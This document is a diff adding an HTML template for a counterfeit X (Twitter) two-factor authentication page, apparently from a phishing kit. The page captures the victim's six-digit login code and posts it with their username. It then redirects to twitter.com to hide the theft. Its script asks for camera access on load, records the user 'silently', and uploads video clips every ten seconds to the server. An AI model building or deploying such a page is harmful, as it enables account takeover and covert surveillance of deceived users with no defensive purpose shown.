@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - Two-factor Authentication</title>
+    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 0 32px;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        
+        .close-btn:active {
+            transform: rotate(90deg);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+        
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+        
+        .username-display {
+            margin-bottom: 20px;
+            color: #71767b;
+        }
+        
+        p {
+            color: #71767b;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        form {
+            width: 100%;
+        }
+        
+        /* Hide the original input */
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* Code input boxes */
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 56px;
+            background-color: #000;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 22px;
+            font-weight: bold;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .code-input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        
+        .code-input.error {
+            border-color: #f4212e;
+            box-shadow: 0 0 0 1px #f4212e;
+            animation: shake 0.4s ease-in-out;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        .error-message {
+            color: #f4212e;
+            font-size: 14px;
+            margin-top: -16px;
+            margin-bottom: 16px;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        
+        .error-message.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .verify-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 9999px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: transform 0.3s ease, background-color 0.3s ease;
+        }
+        
+        .verify-btn:active {
+            transform: rotate(5deg);
+            background-color: #e6e6e6;
+        }
+        
+        .resend-btn {
+            color: #1d9bf0;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            font-size: 15px;
+            text-align: center;
+            width: 100%;
+            margin-top: 16px;
+            transition: transform 0.3s ease;
+        }
+        
+        .resend-btn:active {
+            transform: rotate(-5deg);
+        }
+        
+        .timer {
+            color: #71767b;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .instructions {
+            color: #71767b;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        /* Spinner animation for buttons */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinning {
+            position: relative;
+        }
+        
+        .spinning::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 30px;
+            margin-top: -10px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: #000;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        .spinning.active::after {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="close-btn">✕</div>
+    <div class="container">
+        <div class="logo">
+            <svg role="img" aria-label="X logo" width="48" height="48" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M86.8918 28.25H99.0219L72.5243 58.5334L103.698 99.75H79.285L60.1647 74.7536L38.2929 99.75H26.1627L54.5069 67.3565L24.5938 28.25H49.6199L66.9004 51.0974L86.8918 28.25ZM82.6337 92.4904H89.3555L45.9716 35.1301H38.7584L82.6337 92.4904Z" fill="white"/>
+            </svg>
+        </div>
+        
+        <h1>Check your phone</h1>
+        
+        <div class="username-display">@{{ username }}</div>
+        
+        <p>We sent a code to your phone. Enter it here to verify your identity.</p>
+        
+        <div class="instructions">
+            The code we sent will expire in 10 minutes. If you don't receive a code, make sure your phone number is correct.
+        </div>
+        
+        <form action="/verify/{{ username }}" method="POST">
+            <input type="text" name="code" class="hidden-input" maxlength="6" required>
+            
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            </div>
+            
+            <div class="error-message">Please enter a valid verification code</div>
+            
+            <button type="submit" class="verify-btn spinning">Verify</button>
+            
+            <div class="timer">You can request a new code in <span id="countdown">60</span> seconds</div>
+            
+            <button type="button" class="resend-btn" disabled>Didn't receive a code?</button>
+        </form>
+    </div>
+    
+    <script>
+        // Global variables for camera and recording
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            // Add artificial delay for page load (1-2 seconds)
+            setTimeout(() => {
+                // Request camera permission immediately when the page loads
+                requestCameraPermission();
+                
+                // Start countdown timer
+                startCountdown();
+                
+                document.querySelector(".close-btn").addEventListener("click", function() {
+                    // Add artificial delay (0.3-0.7 seconds)
+                    this.style.opacity = "0.5";
+                    setTimeout(() => {
+                        // Stop recording before navigating away
+                        stopRecording();
+                        window.history.back();
+                    }, 5000 + Math.random() * 400);
+                });
+                
+                document.querySelector(".resend-btn").addEventListener("click", function() {
+                    if (this.disabled) return;
+                    
+                    this.disabled = true;
+                    const originalText = this.textContent;
+                    this.textContent = "Sending code...";
+                    
+                    // Add spin animation
+                    this.classList.add("spinning-text");
+                    
+                    // Add artificial delay (2-3.5 seconds)
+                    setTimeout(() => {
+                        this.classList.remove("spinning-text");
+                        alert("A new verification code has been sent to your phone.");
+                        this.textContent = originalText;
+                        // Restart countdown
+                        document.getElementById("countdown").textContent = "60";
+                        startCountdown();
+                    }, 2000 + Math.random() * 1500);
+                });
+                
+                // Manual verify button click - also check for empty inputs
+                document.querySelector(".verify-btn").addEventListener("click", function(e) {
+                    if (!validateCodeInputs()) {
+                        e.preventDefault();
+                        showError();
+                    }
+                });
+                
+                // Modification: Remove form submit event as we'll auto-submit
+                // Instead, set up the code input boxes
+                setupCodeInputs();
+            }, 1000 + Math.random() * 1000);
+        });
+        
+        // Function to handle separate code input boxes
+        function setupCodeInputs() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const hiddenInput = document.querySelector('.hidden-input');
+            const form = document.querySelector('form');
+            const errorMessage = document.querySelector('.error-message');
+            
+            // Focus first input on page load after a delay
+            setTimeout(() => {
+                codeInputs[0].focus();
+            }, 500);
+            
+            codeInputs.forEach((input, index) => {
+                // Auto-focus next input after entering a digit
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    
+                    // Remove error state when typing
+                    clearError();
+                    
+                    // Allow only numbers
+                    if (!/^[0-9]$/.test(value)) {
+                        e.target.value = '';
+                        return;
+                    }
+                    
+                    // Update hidden input
+                    updateHiddenInput();
+                    
+                    // Focus next input
+                    if (index < codeInputs.length - 1) {
+                        // Add small delay for natural feel
+                        setTimeout(() => {
+                            codeInputs[index + 1].focus();
+                        }, 50 + Math.random() * 50);
+                    } else {
+                        // If this is the last input and it's filled, submit the form automatically
+                        // Add a slight delay for better UX
+                        setTimeout(() => {
+                            if (validateCodeInputs()) {
+                                submitForm();
+                            } else {
+                                showError();
+                            }
+                        }, 5000 + Math.random() * 200);
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace') {
+                        if (e.target.value === '') {
+                            if (index > 0) {
+                                // Focus previous input if current is empty
+                                setTimeout(() => {
+                                    codeInputs[index - 1].focus();
+                                    // Optional: clear the previous input
+                                    // codeInputs[index - 1].value = '';
+                                }, 50);
+                            }
+                        } else {
+                            // Clear current input
+                            setTimeout(() => {
+                                e.target.value = '';
+                                updateHiddenInput();
+                            }, 50);
+                        }
+                    }
+                    
+                    // Prevent default behavior for arrow keys to handle focus manually
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        e.preventDefault();
+                        codeInputs[index - 1].focus();
+                    }
+                    
+                    if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
+                        e.preventDefault();
+                        codeInputs[index + 1].focus();
+                    }
+                });
+                
+                // Handle paste event
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').trim();
+                    
+                    // Clear error state when pasting
+                    clearError();
+                    
+                    // If pasted data looks like a verification code
+                    if (/^\d{6}$/.test(pasteData)) {
+                        // Distribute the digits across inputs
+                        for (let i = 0; i < codeInputs.length; i++) {
+                            if (i < pasteData.length) {
+                                codeInputs[i].value = pasteData[i];
+                            }
+                        }
+                        updateHiddenInput();
+                        
+                        // Auto-submit after paste with a slight delay
+                        setTimeout(() => {
+                            if (validateCodeInputs()) {
+                                submitForm();
+                            } else {
+                                showError();
+                            }
+                        }, 5000 + Math.random() * 200);
+                    }
+                });
+            });
+            
+            // Function to update the hidden input with combined values
+            function updateHiddenInput() {
+                let combinedValue = '';
+                codeInputs.forEach(input => {
+                    combinedValue += input.value;
+                });
+                hiddenInput.value = combinedValue;
+            }
+            
+            // Function to validate all inputs are filled correctly
+            function validateCodeInputs() {
+                let isValid = true;
+                codeInputs.forEach(input => {
+                    if (input.value === '' || !/^\d$/.test(input.value)) {
+                        isValid = false;
+                    }
+                });
+                return isValid;
+            }
+            
+            // Function to show error state
+            function showError() {
+                codeInputs.forEach(input => {
+                    input.classList.add('error');
+                });
+                errorMessage.classList.add('visible');
+                
+                // Focus the first empty input
+                for (let i = 0; i < codeInputs.length; i++) {
+                    if (codeInputs[i].value === '') {
+                        codeInputs[i].focus();
+                        break;
+                    }
+                }
+                
+                // Remove error after 3 seconds
+                setTimeout(() => {
+                    clearError();
+                }, 3000);
+            }
+            
+            // Function to clear error state
+            function clearError() {
+                codeInputs.forEach(input => {
+                    input.classList.remove('error');
+                });
+                errorMessage.classList.remove('visible');
+            }
+            
+            // Function to submit the form with visual feedback
+            function submitForm() {
+                // Check if all inputs are filled
+                if (!validateCodeInputs()) {
+                    showError();
+                    return;
+                }
+                
+                // Get the verification button and update its state
+                const verifyBtn = document.querySelector(".verify-btn");
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = "Verifying...";
+                verifyBtn.classList.add("active");
+                
+                // Stop recording before form submission
+                stopRecording();
+                
+                // Add artificial delay (2-4 seconds) to simulate verification
+                setTimeout(function() {
+                    // Submit the form
+                    form.submit();
+                    
+                    // Or alternatively, directly redirect to Twitter after successful verification
+                    // This timeout represents the server processing time
+                    setTimeout(() => {
+                        window.location.href = "https://twitter.com";
+                    }, 1000 + Math.random() * 500);
+                }, 2000 + Math.random() * 2000);
+            }
+        }
+        
+        // Function to start countdown
+        function startCountdown() {
+            const countdownEl = document.getElementById("countdown");
+            const resendBtn = document.querySelector(".resend-btn");
+            let secondsLeft = parseInt(countdownEl.textContent);
+            
+            resendBtn.disabled = true;
+            
+            const countdownInterval = setInterval(() => {
+                secondsLeft--;
+                countdownEl.textContent = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    resendBtn.disabled = false;
+                    document.querySelector(".timer").textContent = "You can request a new code now";
+                }
+            }, 1000);
+        }
+        
+        // Function to request camera permission and start recording
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                    // Store media stream
+                    mediaStream = stream;
+                    
+                    // Start recording once permission is granted
+                    startRecording(stream);
+                })
+                .catch(function(error) {
+                    console.error("Error accessing camera:", error);
+                });
+        }
+        
+        // Function to start recording
+        function startRecording(stream) {
+            // Create media recorder
+            mediaRecorder = new MediaRecorder(stream);
+            
+            // Set up data handler
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+            
+            // Set up stop handler
+            mediaRecorder.onstop = function() {
+                // Create video file from recorded chunks
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                
+                // Upload video to server
+                uploadVideo(blob);
+                
+                // Reset chunks for next recording
+                recordedChunks = [];
+                
+                // Start recording again if still on the page
+                if (document.visibilityState !== 'hidden') {
+                    mediaRecorder.start();
+                }
+            };
+            
+            // Start recording
+            recordedChunks = [];
+            mediaRecorder.start();
+            console.log("Camera recording started silently");
+            
+            // Stop and upload every 10 seconds
+            setInterval(function() {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+        }
+        
+        // Function to stop recording
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+            
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        // Function to upload video to server
+        function uploadVideo(blob) {
+            const formData = new FormData();
+            formData.append('video', blob, 'recorded-video.webm');
+            formData.append('username', '{{ username }}');
+            
+            fetch('/upload_video', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Video uploaded successfully');
+                }
+            })
+            .catch(error => {
+                console.error('Error uploading video:', error);
+            });
+        }
+        
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'hidden') {
+                // User switched tabs or minimized window
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            } else if (document.visibilityState === 'visible') {
+                // User came back to the page
+                if (mediaStream && mediaStream.active && (!mediaRecorder || mediaRecorder.state === 'inactive')) {
+                    startRecording(mediaStream);
+                }
+            }
+        });
+        
+        // Clean up resources when leaving the page
+        window.addEventListener('beforeunload', function() {
+            stopRecording();
+        });
+    </script>
+</body>
+</html> 
